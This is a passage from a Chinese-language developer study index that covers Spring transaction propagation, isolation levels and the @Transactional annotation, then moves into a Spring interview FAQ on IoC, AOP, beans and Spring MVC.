bMethod()如果发生异常需要回滚，如何配置事务传播行为才能让 aMethod()也跟着回滚呢？这个时候就需要事务传播行为的知识了，如果你不知道的话一定要好好看一下。\nClass A { @Transactional(propagation=propagation.xxx) public void aMethod { //do something  B b = new B(); b.bMethod(); } } Class B { @Transactional(propagation=propagation.xxx) public void bMethod { //do something  } } 在TransactionDefinition定义中包括了如下几个表示传播行为的常量：\npublic interface TransactionDefinition { int PROPAGATION_REQUIRED = 0; int PROPAGATION_SUPPORTS = 1; int PROPAGATION_MANDATORY = 2; int PROPAGATION_REQUIRES_NEW = 3; int PROPAGATION_NOT_SUPPORTED = 4; int PROPAGATION_NEVER = 5; int PROPAGATION_NESTED = 6; ...... } 不过如此，为了方便使用，Spring 会相应地定义了一个枚举类：Propagation\npackage org.springframework.transaction.annotation; import org.springframework.transaction.TransactionDefinition; public enum Propagation { REQUIRED(TransactionDefinition.PROPAGATION_REQUIRED), SUPPORTS(TransactionDefinition.PROPAGATION_SUPPORTS), MANDATORY(TransactionDefinition.PROPAGATION_MANDATORY), REQUIRES_NEW(TransactionDefinition.PROPAGATION_REQUIRES_NEW), NOT_SUPPORTED(TransactionDefinition.PROPAGATION_NOT_SUPPORTED), NEVER(TransactionDefinition.PROPAGATION_NEVER), NESTED(TransactionDefinition.PROPAGATION_NESTED); private final int value; Propagation(int value) { this.value = value; } public int value() { return this.value; } } 正确的事务传播行为可能的值如下 ：\n1.TransactionDefinition.PROPAGATION_REQUIRED\n使用的最多的一个事务传播行为，我们平时经常使用的@Transactional注解默认使用就是这个事务传播行为。如果当前存在事务，则加入该事务；如果当前没有事务，则创建一个新的事务。也就是说：\n 如果外部方法没有开启事务的话，Propagation.REQUIRED修饰的内部方法会新开启自己的事务，且开启的事务相互独立，互不干扰。 如果外部方法开启事务并且被Propagation.REQUIRED的话，所有Propagation.REQUIRED修饰的内部方法和外部方法均属于同一事务 ，只要一个方法回滚，整个事务均回滚。  举个例子：如果我们上面的aMethod()和bMethod()使用的都是PROPAGATION_REQUIRED传播行为的话，两者使用的就是同一个事务，只要其中一个方法回滚，整个事务均回滚。\nClass A { @Transactional(propagation=propagation.PROPAGATION_REQUIRED) public void aMethod { //do something  B b = new B(); b.bMethod(); } } Class B { @Transactional(propagation=propagation.PROPAGATION_REQUIRED) public void bMethod { //do something  } } 2.TransactionDefinition.PROPAGATION_REQUIRES_NEW\n创建一个新的事务，如果当前存在事务，则把当前事务挂起。也就是说不管外部方法是否开启事务，Propagation.REQUIRES_NEW修饰的内部方法会新开启自己的事务，且开启的事务相互独立，互不干扰。\n举个例子：如果我们上面的bMethod()使用PROPAGATION_REQUIRES_NEW事务传播行为修饰，aMethod还是用PROPAGATION_REQUIRED修饰的话。如果aMethod()发生异常回滚，bMethod()不会跟着回滚，因为 bMethod()开启了独立的事务。但是，如果 bMethod()抛出了未被捕获的异常并且这个异常满足事务回滚规则的话,aMethod()同样也会回滚，因为这个异常被 aMethod()的事务管理机制检测到了。\nClass A { @Transactional(propagation=propagation.PROPAGATION_REQUIRED) public void aMethod { //do something  B b = new B(); b.bMethod(); } } Class B { @Transactional(propagation=propagation.REQUIRES_NEW) public void bMethod { //do something  } } 3.TransactionDefinition.PROPAGATION_NESTED:\n如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行；如果当前没有事务，则该取值等价于TransactionDefinition.PROPAGATION_REQUIRED。也就是说：\n 在外部方法未开启事务的情况下Propagation.NESTED和Propagation.REQUIRED作用相同，修饰的内部方法都会新开启自己的事务，且开启的事务相互独立，互不干扰。 如果外部方法开启事务的话，Propagation.NESTED修饰的内部方法属于外部事务的子事务，外部主事务回滚的话，子事务也会回滚，而内部子事务可以单独回滚而不影响外部主事务和其他子事务。  这里还是简单举个例子：\n如果 aMethod() 回滚的话，bMethod()和bMethod2()都要回滚，而bMethod()回滚的话，并不会造成 aMethod() 和bMethod()2回滚。\nClass A { @Transactional(propagation=propagation.PROPAGATION_REQUIRED) public void aMethod { //do something  B b = new B(); b.bMethod(); b.bMethod2(); } } Class B { @Transactional(propagation=propagation.PROPAGATION_NESTED) public void bMethod { //do something  } @Transactional(propagation=propagation.PROPAGATION_NESTED) public void bMethod2 { //do something  } } 4.TransactionDefinition.PROPAGATION_MANDATORY\n如果当前存在事务，则加入该事务；如果当前没有事务，则抛出异常。（mandatory：强制性）\n这个使用的很少，就不举例子来说了。\n若是错误的配置以下 3 种事务传播行为，事务将不会发生回滚，这里不对照案例讲解了，使用的很少。\n TransactionDefinition.PROPAGATION_SUPPORTS: 如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行。 TransactionDefinition.PROPAGATION_NOT_SUPPORTED: 以非事务方式运行，如果当前存在事务，则把当前事务挂起。 TransactionDefinition.PROPAGATION_NEVER: 以非事务方式运行，如果当前存在事务，则抛出异常。  更多关于事务传播行为的内容请看这篇文章：《太难了~面试官让我结合案例讲讲自己对 Spring 事务传播行为的理解。》\n3.3.2 事务隔离级别    TransactionDefinition 接口中定义了五个表示隔离级别的常量：\npublic interface TransactionDefinition { ...... int ISOLATION_DEFAULT = -1; int ISOLATION_READ_UNCOMMITTED = 1; int ISOLATION_READ_COMMITTED = 2; int ISOLATION_REPEATABLE_READ = 4; int ISOLATION_SERIALIZABLE = 8; ...... } 和事务传播行为这块一样，为了方便使用，Spring 也相应地定义了一个枚举类：Isolation\npublic enum Isolation { DEFAULT(TransactionDefinition.ISOLATION_DEFAULT), READ_UNCOMMITTED(TransactionDefinition.ISOLATION_READ_UNCOMMITTED), READ_COMMITTED(TransactionDefinition.ISOLATION_READ_COMMITTED), REPEATABLE_READ(TransactionDefinition.ISOLATION_REPEATABLE_READ), SERIALIZABLE(TransactionDefinition.ISOLATION_SERIALIZABLE); private final int value; Isolation(int value) { this.value = value; } public int value() { return this.value; } } 下面我依次对每一种事务隔离级别进行介绍：\n TransactionDefinition.ISOLATION_DEFAULT :使用后端数据库默认的隔离级别，MySQL 默认采用的 REPEATABLE_READ 隔离级别 Oracle 默认采用的 READ_COMMITTED 隔离级别. TransactionDefinition.ISOLATION_READ_UNCOMMITTED :最低的隔离级别，使用这个隔离级别很少，因为它允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读 TransactionDefinition.ISOLATION_READ_COMMITTED : 允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生 TransactionDefinition.ISOLATION_REPEATABLE_READ : 对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。 TransactionDefinition.ISOLATION_SERIALIZABLE : 最高的隔离级别，完全服从 ACID 的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。但是这将严重影响程序的性能。通常情况下也不会用到该级别。  因为平时使用 MySQL 数据库比较多，这里再多提一嘴！\nMySQL InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ（可重读）。我们可以通过SELECT @@tx_isolation;命令来查看，MySQL 8.0 该命令改为SELECT @@transaction_isolation;\nmysql\u0026gt; SELECT @@tx_isolation; +-----------------+ | @@tx_isolation | +-----------------+ | REPEATABLE-READ | +-----------------+ 这里需要注意的是：与 SQL 标准不同的地方在于 InnoDB 存储引擎在 REPEATABLE-READ（可重读） 事务隔离级别下使用的是Next-Key Lock 锁算法，因此可以避免幻读的产生，这与其他数据库系统(如 SQL Server)是不同的。所以说InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ（可重读） 已经可以完全保证事务的隔离性要求，即达到了 SQL标准的 SERIALIZABLE(可串行化) 隔离级别。\n🐛问题更正：MySQL InnoDB的REPEATABLE-READ（可重读）并不保证避免幻读，需要应用使用加锁读来保证。而这个加锁度使用到的机制就是 Next-Key Locks。\n因为隔离级别越低，事务请求的锁越少，所以大部分数据库系统的隔离级别都是 READ-COMMITTED(读取提交内容) ，但是你要知道的是InnoDB 存储引擎默认使用 REPEAaTABLE-READ（可重读） 并不会有任何性能损失。\nInnoDB 存储引擎在 分布式事务 的情况下一般会用到 SERIALIZABLE(可串行化) 隔离级别。\n🌈拓展一下(以下内容摘自《MySQL技术内幕：InnoDB存储引擎(第2版)》7.7章)：\n InnoDB存储引擎提供了对XA事务的支持，并通过XA事务来支持分布式事务的实现。分布式事务指的是允许多个独立的事务资源（transactional resources）参与到一个全局的事务中。事务资源通常是关系型数据库系统，但也可以是其他类型的资源。全局事务要求在其中的所有参与的事务要么都提交，要么都回滚，这对于事务原有的ACID要求又有了提高。另外，在使用分布式事务时，InnoDB存储引擎的事务隔离级别必须设置为SERIALIZABLE。\n 3.3.3. 事务超时属性    所谓事务超时，就是指一个事务所允许执行的最长时间，如果超过该时间限制但事务还没有完成，则自动回滚事务。在 TransactionDefinition 中以 int 的值来表示超时时间，其单位是秒，默认值为-1。\n3.3.4. 事务只读属性    package org.springframework.transaction; import org.springframework.lang.Nullable; public interface TransactionDefinition { ...... // 返回是否为只读事务，默认值为 false  boolean isReadOnly(); } 对于只有读取数据查询的事务，可以指定事务类型为 readonly，即只读事务。只读事务不涉及数据的修改，数据库会提供一些优化手段，适合用在有多条数据库查询操作的方法中。\n很多人就会疑问了，为什么我一个数据查询操作还要启用事务支持呢？\n拿 MySQL 的 innodb 举例子，根据官网 https://dev.mysql.com/doc/refman/5.7/en/innodb-autocommit-commit-rollback.html 描述：\n MySQL 默认对每一个新建立的连接都启用了autocommit模式。在该模式下，每一个发送到 MySQL 服务器的sql语句都会在一个单独的事务中进行处理，执行结束后会自动提交事务，并开启一个新的事务。\n 但是，如果你给方法加上了Transactional注解的话，这个方法执行的所有sql会被放在一个事务中。如果声明了只读事务的话，数据库就会去优化它的执行，并不会带来其他的什么收益。\n如果不加Transactional，每条sql会开启一个单独的事务，中间被其它事务改了数据，都会实时读取到最新值。\n分享一下关于事务只读属性，其他人的解答：\n 如果你一次执行单条查询语句，则没有必要启用事务支持，数据库默认支持 SQL 执行期间的读一致性； 如果你一次执行多条查询语句，例如统计查询，报表查询，在这种场景下，多条查询 SQL 必须保证整体的读一致性，否则，在前条 SQL 查询之后，后条 SQL 查询之前，数据被其他用户改变，则该次整体的统计查询将会出现读数据不一致的状态，此时，应该启用事务支持  3.3.5. 事务回滚规则    这些规则定义了哪些异常会导致事务回滚而哪些不会。默认情况下，事务只有遇到运行期异常（RuntimeException 的子类）时才会回滚，Error 也会导致事务回滚，但是，在遇到检查型（Checked）异常时不会回滚。\n如果你想要回滚你定义的特定的异常类型的话，可以这样：\n@Transactional(rollbackFor= MyException.class) 3.4. @Transactional 注解使用详解    1) @Transactional 的作用范围     方法 ：推荐将注解使用于方法上，不过需要注意的是：该注解只能应用到 public 方法上，否则不生效。 类 ：如果这个注解使用在类上的话，表明该注解对该类中所有的 public 方法都生效。 接口 ：不推荐在接口上使用。  2) @Transactional 的常用配置参数    @Transactional注解源码如下，里面包含了基本事务属性的配置：\n@Target({ElementType.TYPE, ElementType.METHOD}) @Retention(RetentionPolicy.RUNTIME) @Inherited @Documented public @interface Transactional { @AliasFor(\u0026#34;transactionManager\u0026#34;) String value() default \u0026#34;\u0026#34;; @AliasFor(\u0026#34;value\u0026#34;) String transactionManager() default \u0026#34;\u0026#34;; Propagation propagation() default Propagation.REQUIRED; Isolation isolation() default Isolation.DEFAULT; int timeout() default TransactionDefinition.TIMEOUT_DEFAULT; boolean readOnly() default false; Class\u0026lt;? extends Throwable\u0026gt;[] rollbackFor() default {}; String[] rollbackForClassName() default {}; Class\u0026lt;? extends Throwable\u0026gt;[] noRollbackFor() default {}; String[] noRollbackForClassName() default {}; } @Transactional 的常用配置参数总结（只列出了 5 个我平时比较常用的）：\n   属性名 说明     propagation 事务的传播行为，默认值为 REQUIRED，可选的值在上面介绍过   isolation 事务的隔离级别，默认值采用 DEFAULT，可选的值在上面介绍过   timeout 事务的超时时间，默认值为-1（不会超时）。如果超过该时间限制但事务还没有完成，则自动回滚事务。   readOnly 指定事务是否为只读事务，默认值为 false。   rollbackFor 用于指定能够触发事务回滚的异常类型，并且可以指定多个异常类型。    3)@Transactional 事务注解原理    面试中在问 AOP 的时候可能会被问到的一个问题。简单说下吧！\n我们知道，@Transactional 的工作机制是基于 AOP 实现的，AOP 又是使用动态代理实现的。如果目标对象实现了接口，默认情况下会采用 JDK 的动态代理，如果目标对象没有实现了接口,会使用 CGLIB 动态代理。\n多提一嘴：createAopProxy() 方法 决定了是使用 JDK 还是 Cglib 来做动态代理，源码如下：\npublic class DefaultAopProxyFactory implements AopProxyFactory, Serializable { @Override public AopProxy createAopProxy(AdvisedSupport config) throws AopConfigException { if (config.isOptimize() || config.isProxyTargetClass() || hasNoUserSuppliedProxyInterfaces(config)) { Class\u0026lt;?\u0026gt; targetClass = config.getTargetClass(); if (targetClass == null) { throw new AopConfigException(\u0026#34;TargetSource cannot determine target class: \u0026#34; + \u0026#34;Either an interface or a target is required for proxy creation.\u0026#34;); } if (targetClass.isInterface() || Proxy.isProxyClass(targetClass)) { return new JdkDynamicAopProxy(config); } return new ObjenesisCglibAopProxy(config); } else { return new JdkDynamicAopProxy(config); } } ....... } 如果一个类或者一个类中的 public 方法上被标注@Transactional 注解的话，Spring 容器就会在启动的时候为其创建一个代理类，在调用被@Transactional 注解的 public 方法的时候，实际调用的是，TransactionInterceptor 类中的 invoke()方法。这个方法的作用就是在目标方法之前开启事务，方法执行过程中如果遇到异常的时候回滚事务，方法调用完成之后提交事务。\n TransactionInterceptor 类中的 invoke()方法内部实际调用的是 TransactionAspectSupport 类的 invokeWithinTransaction()方法。由于新版本的 Spring 对这部分重写很大，而且用到了很多响应式编程的知识，这里就不列源码了。\n 4)Spring AOP 自调用问题    若同一类中的其他没有 @Transactional 注解的方法内部调用有 @Transactional 注解的方法，有@Transactional 注解的方法的事务会失效。\n这是由于Spring AOP代理的原因造成的，因为只有当 @Transactional 注解的方法在类以外被调用的时候，Spring 事务管理才生效。\nMyService 类中的method1()调用method2()就会导致method2()的事务失效。\n@Service public class MyService { private void method1() { method2(); //...... } @Transactional public void method2() { //......  } } 解决办法就是避免同一类中自调用或者使用 AspectJ 取代 Spring AOP 代理。\n5) @Transactional 的使用注意事项总结     @Transactional 注解只有作用到 public 方法上事务才生效，不推荐在接口上使用； 避免同一个类中调用 @Transactional 注解的方法，这样会导致事务失效； 正确的设置 @Transactional 的 rollbackFor 和 propagation 属性，否则事务可能会回滚失败 \u0026hellip;\u0026hellip;  4. Reference      [总结]Spring 事务管理中@Transactional 的参数:http://www.mobabel.net/spring 事务管理中 transactional 的参数/\n  Spring 官方文档：https://docs.spring.io/spring/docs/4.2.x/spring-framework-reference/html/transaction.html\n  《Spring5 高级编程》\n  透彻的掌握 Spring 中@transactional 的使用: https://www.ibm.com/developerworks/cn/java/j-master-spring-transactional-use/index.html\n  Spring 事务的传播特性：https://github.com/love-somnus/Spring/wiki/Spring 事务的传播特性\n  Spring 事务传播行为详解 ：https://segmentfault.com/a/1190000013341344\n  全面分析 Spring 的编程式事务管理及声明式事务管理：https://www.ibm.com/developerworks/cn/education/opensource/os-cn-spring-trans/index.html\n  "},{"id":306,"href":"/system-design/framework/spring/Spring%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/","title":"Spring常见问题总结","parent":"spring","content":"这篇文章主要是想通过一些问题，加深大家对于 Spring 的理解，所以不会涉及太多的代码！\n下面的很多问题我自己在使用 Spring 的过程中也并没有注意，自己也是临时查阅了很多资料和书籍补上的。网上也有一些很多关于 Spring 常见问题/面试题整理的文章，我感觉大部分都是互相 copy，而且很多问题也不是很好，有些回答也存在问题。所以，自己花了一周的业余时间整理了一下，希望对大家有帮助。\n什么是 Spring 框架?    Spring 是一款开源的轻量级 Java 开发框架，旨在提高开发人员的开发效率以及系统的可维护性。\nSpring 翻译过来就是春天的意思，可见其目标和使命就是为 Java 程序员带来春天啊！感动！\n 题外话 ： 语言的流行通常需要一个杀手级的应用，Spring 就是 Java 生态的一个杀手级的应用框架。\n 我们一般说 Spring 框架指的都是 Spring Framework，它是很多模块的集合，使用这些模块可以很方便地协助我们进行开发。\n比如说 Spring 自带 IoC（Inverse of Control:控制反转） 和 AOP(Aspect-Oriented Programming:面向切面编程)、可以很方便地对数据库进行访问、可以很方便地集成第三方组件（电子邮件，任务，调度，缓存等等）、对单元测试支持比较好、支持 RESTful Java 应用程序的开发。\nSpring 最核心的思想就是不重新造轮子，开箱即用！\nSpring 提供的核心功能主要是 IoC 和 AOP。学习 Spring ，一定要把 IoC 和 AOP 的核心思想搞懂！\n Spring 官网：https://spring.io/ Github 地址： https://github.com/spring-projects/spring-framework  列举一些重要的 Spring 模块？    下图对应的是 Spring4.x 版本。目前最新的 5.x 版本中 Web 模块的 Portlet 组件已经被废弃掉，同时增加了用于异步响应式处理的 WebFlux 组件。\nSpring Core\n核心模块， Spring 其他所有的功能基本都需要依赖于该类库，主要提供 IoC 依赖注入功能的支持。\nSpring Aspects\n该模块为与 AspectJ 的集成提供支持。\nSpring AOP\n提供了面向切面的编程实现。\nSpring Data Access/Integration ：\nSpring Data Access/Integration 由 5 个模块组成：\n spring-jdbc : 提供了对数据库访问的抽象 JDBC。不同的数据库都有自己独立的 API 用于操作数据库，而 Java 程序只需要和 JDBC API 交互，这样就屏蔽了数据库的影响。 spring-tx : 提供对事务的支持。 spring-orm : 提供对 Hibernate 等 ORM 框架的支持。 spring-oxm ： 提供对 Castor 等 OXM 框架的支持。 spring-jms : Java 消息服务。  Spring Web\nSpring Web 由 4 个模块组成：\n spring-web ：对 Web 功能的实现提供一些最基础的支持。 spring-webmvc ： 提供对 Spring MVC 的实现。 spring-websocket ： 提供了对 WebSocket 的支持，WebSocket 可以让客户端和服务端进行双向通信。 spring-webflux ：提供对 WebFlux 的支持。WebFlux 是 Spring Framework 5.0 中引入的新的响应式框架。与 Spring MVC 不同，它不需要 Servlet API，是完全异步.  Spring Test\nSpring 团队提倡测试驱动开发（TDD）。有了控制反转 (IoC)的帮助，单元测试和集成测试变得更简单。\nSpring 的测试模块对 JUnit（单元测试框架）、TestNG（类似 JUnit）、Mockito（主要用来 Mock 对象）、PowerMock（解决 Mockito 的问题比如无法模拟 final, static， private 方法）等等常用的测试框架支持的都比较好。\nSpring IOC \u0026amp; AOP    谈谈自己对于 Spring IoC 的了解    IoC（Inverse of Control:控制反转） 是一种设计思想，而不是一个具体的技术实现。IoC 的思想就是将原本在程序中手动创建对象的控制权，交由 Spring 框架来管理。不过， IoC 并非 Spirng 特有，在其他语言中也有应用。\n为什么叫控制反转？\n 控制 ：指的是对象创建（实例化、管理）的权力 反转 ：控制权交给外部环境（Spring 框架、IoC 容器）  将对象之间的相互依赖关系交给 IoC 容器来管理，并由 IoC 容器完成对象的注入。这样可以很大程度上简化应用的开发，把应用从复杂的依赖关系中解放出来。 IoC 容器就像是一个工厂一样，当我们需要创建一个对象的时候，只需要配置好配置文件/注解即可，完全不用考虑对象是如何被创建出来的。\n在实际项目中一个 Service 类可能依赖了很多其他的类，假如我们需要实例化这个 Service，你可能要每次都要搞清这个 Service 所有底层类的构造函数，这可能会把人逼疯。如果利用 IoC 的话，你只需要配置好，然后在需要的地方引用就行了，这大大增加了项目的可维护性且降低了开发难度。\n在 Spring 中， IoC 容器是 Spring 用来实现 IoC 的载体， IoC 容器实际上就是个 Map（key，value），Map 中存放的是各种对象。\nSpring 时代我们一般通过 XML 文件来配置 Bean，后来开发人员觉得 XML 文件来配置不太好，于是 SpringBoot 注解配置就慢慢开始流行起来。\n相关阅读：\n IoC 源码阅读 面试被问了几百遍的 IoC 和 AOP ，还在傻傻搞不清楚？  谈谈自己对于 AOP 的了解    AOP(Aspect-Oriented Programming:面向切面编程)能够将那些与业务无关，却为业务模块所共同调用的逻辑或责任（例如事务处理、日志管理、权限控制等）封装起来，便于减少系统的重复代码，降低模块间的耦合度，并有利于未来的可拓展性和可维护性。\nSpring AOP 就是基于动态代理的，如果要代理的对象，实现了某个接口，那么 Spring AOP 会使用 JDK Proxy，去创建代理对象，而对于没有实现接口的对象，就无法使用 JDK Proxy 去进行代理了，这时候 Spring AOP 会使用 Cglib 生成一个被代理对象的子类来作为代理，如下图所示：\n当然你也可以使用 AspectJ ！Spring AOP 已经集成了 AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。\nSpring AOP 和 AspectJ AOP 有什么区别？    Spring AOP 属于运行时增强，而 AspectJ 是编译时增强。 Spring AOP 基于代理(Proxying)，而 AspectJ 基于字节码操作(Bytecode Manipulation)。\nSpring AOP 已经集成了 AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。AspectJ 相比于 Spring AOP 功能更加强大，但是 Spring AOP 相对来说更简单，\n如果我们的切面比较少，那么两者性能差异不大。但是，当切面太多的话，最好选择 AspectJ ，它比 Spring AOP 快很多。\nSpring bean    什么是 bean？    简单来说，bean 代指的就是那些被 IoC 容器所管理的对象。\n我们需要告诉 IoC 容器帮助我们管理哪些对象，这个是通过配置元数据来定义的。配置元数据可以是 XML 文件、注解或者 Java 配置类。\n\u0026lt;!-- Constructor-arg with \u0026#39;value\u0026#39; attribute --\u0026gt; \u0026lt;bean id=\u0026#34;...\u0026#34; class=\u0026#34;...\u0026#34;\u0026gt; \u0026lt;constructor-arg value=\u0026#34;...\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 下图简单地展示了 IoC 容器如何使用配置元数据来管理对象。\norg.springframework.beans和 org.springframework.context 这两个包是 IoC 实现的基础，如果想要研究 IoC 相关的源码的话，可以去看看\nbean 的作用域有哪些?    Spring 中 Bean 的作用域通常有下面几种：\n singleton : 唯一 bean 实例，Spring 中的 bean 默认都是单例的，对单例设计模式的应用。 prototype : 每次请求都会创建一个新的 bean 实例。 request : 每一次 HTTP 请求都会产生一个新的 bean，该 bean 仅在当前 HTTP request 内有效。 session : 每一次来自新 session 的 HTTP 请求都会产生一个新的 bean，该 bean 仅在当前 HTTP session 内有效。 global-session ： 全局 session 作用域，仅仅在基于 portlet 的 web 应用中才有意义，Spring5 已经没有了。Portlet 是能够生成语义代码(例如：HTML)片段的小型 Java Web 插件。它们基于 portlet 容器，可以像 servlet 一样处理 HTTP 请求。但是，与 servlet 不同，每个 portlet 都有不同的会话。  如何配置 bean 的作用域呢？\nxml 方式：\n\u0026lt;bean id=\u0026#34;...\u0026#34; class=\u0026#34;...\u0026#34; scope=\u0026#34;singleton\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 注解方式：\n@Bean @Scope(value = ConfigurableBeanFactory.SCOPE_PROTOTYPE) public Person personPrototype() { return new Person(); } 单例 bean 的线程安全问题了解吗？    大部分时候我们并没有在项目中使用多线程，所以很少有人会关注这个问题。单例 bean 存在线程问题，主要是因为当多个线程操作同一个对象的时候是存在资源竞争的。\n常见的有两种解决办法：\n 在 bean 中尽量避免定义可变的成员变量。 在类中定义一个 ThreadLocal 成员变量，将需要的可变成员变量保存在 ThreadLocal 中（推荐的一种方式）。  不过，大部分 bean 实际都是无状态（没有实例变量）的（比如 Dao、Service），这种情况下， bean 是线程安全的。\n@Component 和 @Bean 的区别是什么？     @Component 注解作用于类，而@Bean注解作用于方法。 @Component通常是通过类路径扫描来自动侦测以及自动装配到 Spring 容器中（我们可以使用 @ComponentScan 注解定义要扫描的路径从中找出标识了需要装配的类自动装配到 Spring 的 bean 容器中）。@Bean 注解通常是我们在标有该注解的方法中定义产生这个 bean,@Bean告诉了 Spring 这是某个类的实例，当我需要用它的时候还给我。 @Bean 注解比 @Component 注解的自定义性更强，而且很多地方我们只能通过 @Bean 注解来注册 bean。比如当我们引用第三方库中的类需要装配到 Spring容器时，则只能通过 @Bean来实现。  @Bean注解使用示例：\n@Configuration public class AppConfig { @Bean public TransferService transferService() { return new TransferServiceImpl(); } } 上面的代码相当于下面的 xml 配置\n\u0026lt;beans\u0026gt; \u0026lt;bean id=\u0026#34;transferService\u0026#34; class=\u0026#34;com.acme.TransferServiceImpl\u0026#34;/\u0026gt; \u0026lt;/beans\u0026gt; 下面这个例子是通过 @Component 无法实现的。\n@Bean public OneService getService(status) { case (status) { when 1: return new serviceImpl1(); when 2: return new serviceImpl2(); when 3: return new serviceImpl3(); } } 将一个类声明为 bean 的注解有哪些?    我们一般使用 @Autowired 注解自动装配 bean，要想把类标识成可用于 @Autowired 注解自动装配的 bean 的类,采用以下注解可实现：\n @Component ：通用的注解，可标注任意类为 Spring 组件。如果一个 Bean 不知道属于哪个层，可以使用@Component 注解标注。 @Repository : 对应持久层即 Dao 层，主要用于数据库相关操作。 @Service : 对应服务层，主要涉及一些复杂的逻辑，需要用到 Dao 层。 @Controller : 对应 Spring MVC 控制层，主要用户接受用户请求并调用 Service 层返回数据给前端页面。  bean 的生命周期?     下面的内容整理自：https://yemengying.com/2016/07/14/spring-bean-life-cycle/ ，除了这篇文章，再推荐一篇很不错的文章 ：https://www.cnblogs.com/zrtqsk/p/3735273.html 。\n  Bean 容器找到配置文件中 Spring Bean 的定义。 Bean 容器利用 Java Reflection API 创建一个 Bean 的实例。 如果涉及到一些属性值 利用 set()方法设置一些属性值。 如果 Bean 实现了 BeanNameAware 接口，调用 setBeanName()方法，传入 Bean 的名字。 如果 Bean 实现了 BeanClassLoaderAware 接口，调用 setBeanClassLoader()方法，传入 ClassLoader对象的实例。 如果 Bean 实现了 BeanFactoryAware 接口，调用 setBeanFactory()方法，传入 BeanFactory对象的实例。 与上面的类似，如果实现了其他 *.Aware接口，就调用相应的方法。 如果有和加载这个 Bean 的 Spring 容器相关的 BeanPostProcessor 对象，执行postProcessBeforeInitialization() 方法 如果 Bean 实现了InitializingBean接口，执行afterPropertiesSet()方法。 如果 Bean 在配置文件中的定义包含 init-method 属性，执行指定的方法。 如果有和加载这个 Bean 的 Spring 容器相关的 BeanPostProcessor 对象，执行postProcessAfterInitialization() 方法 当要销毁 Bean 的时候，如果 Bean 实现了 DisposableBean 接口，执行 destroy() 方法。 当要销毁 Bean 的时候，如果 Bean 在配置文件中的定义包含 destroy-method 属性，执行指定的方法。  图示：\n与之比较类似的中文版本:\nSpring MVC    说说自己对于 Spring MVC 了解?    MVC 是模型(Model)、视图(View)、控制器(Controller)的简写，其核心思想是通过将业务逻辑、数据、显示分离来组织代码。\n网上有很多人说 MVC 不是设计模式，只是软件设计规范，我个人更倾向于 MVC 同样是众多设计模式中的一种。java-design-patterns 项目中就有关于 MVC 的相关介绍。\n想要真正理解 Spring MVC，我们先来看看 Model 1 和 Model 2 这两个没有 Spring MVC 的时代。\nModel 1 时代\n很多学 Java 后端比较晚的朋友可能并没有接触过 Model 1 时代下的 JavaWeb 应用开发。在 Model1 模式下，整个 Web 应用几乎全部用 JSP 页面组成，只用少量的 JavaBean 来处理数据库连接、访问等操作。\n这个模式下 JSP 即是控制层（Controller）又是表现层（View）。显而易见，这种模式存在很多问题。比如控制逻辑和表现逻辑混杂在一起，导致代码重用率极低；再比如前端和后端相互依赖，难以进行测试维护并且开发效率极低。\nModel 2 时代\n学过 Servlet 并做过相关 Demo 的朋友应该了解“Java Bean(Model)+ JSP（View）+Servlet（Controller） ”这种开发模式，这就是早期的 JavaWeb MVC 开发模式。\n Model:系统涉及的数据，也就是 dao 和 bean。 View：展示模型中的数据，只是用来展示。 Controller：处理用户请求都发送给 ，返回数据给 JSP 并展示给用户。  Model2 模式下还存在很多问题，Model2 的抽象和封装程度还远远不够，使用 Model2 进行开发时不可避免地会重复造轮子，这就大大降低了程序的可维护性和复用性。\n于是，很多 JavaWeb 开发相关的 MVC 框架应运而生比如 Struts2，但是 Struts2 比较笨重。\nSpring MVC 时代\n随着 Spring 轻量级开发框架的流行，Spring 生态圈出现了 Spring MVC 框架， Spring MVC 是当前最优秀的 MVC 框架。相比于 Struts2 ， Spring MVC 使用更加简单和方便，开发效率更高，并且 Spring MVC 运行速度更快。\nMVC 是一种设计模式,Spring MVC 是一款很优秀的 MVC 框架。Spring MVC 可以帮助我们进行更简洁的 Web 层的开发，并且它天生与 Spring 框架集成。Spring MVC 下我们一般把后端项目分为 Service 层（处理业务）、Dao 层（数据库操作）、Entity 层（实体类）、Controller 层(控制层，返回数据给前台页面)。\nSpringMVC 工作原理了解吗?    Spring MVC 原理如下图所示：\n SpringMVC 工作原理的图解我没有自己画，直接图省事在网上找了一个非常清晰直观的，原出处不明。\n 流程说明（重要）：\n 客户端（浏览器）发送请求，直接请求到 DispatcherServlet。 DispatcherServlet 根据请求信息调用 HandlerMapping，解析请求对应的 Handler。 解析到对应的 Handler（也就是我们平常说的 Controller 控制器）后，开始由 HandlerAdapter 适配器处理。 HandlerAdapter 会根据 Handler来调用真正的处理器开处理请求，并处理相应的业务逻辑。 处理器处理完业务后，会返回一个 ModelAndView 对象，Model 是返回的数据对象，View 是个逻辑上的 View。 ViewResolver 会根据逻辑 View 查找实际的 View。 DispaterServlet 把返回的 Model 传给 View（视图渲染）。 把 View 返回给请求者（浏览器）  Spring 框架中用到了哪些设计模式？    关于下面一些设计模式的详细介绍，可以看笔主前段时间的原创文章《面试官:“谈谈 Spring 中都用到了那些设计模式?”。》 。\n 工厂设计模式 : Spring 使用工厂模式通过 BeanFactory、ApplicationContext 创建 bean 对象。 代理设计模式 : Spring AOP 功能的实现。 单例设计模式 : Spring 中的 Bean 默认都是单例的。 模板方法模式 : Spring 中 jdbcTemplate、hibernateTemplate 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。 包装器设计模式 : 我们的项目需要连接多个数据库，而且不同的客户在每次访问中根据需要会去访问不同的数据库。这种模式让我们可以根据客户的需求能够动态切换不同的数据源。 观察者模式: Spring 事件驱动模型就是观察者模式很经典的一个应用。 适配器模式 : Spring AOP 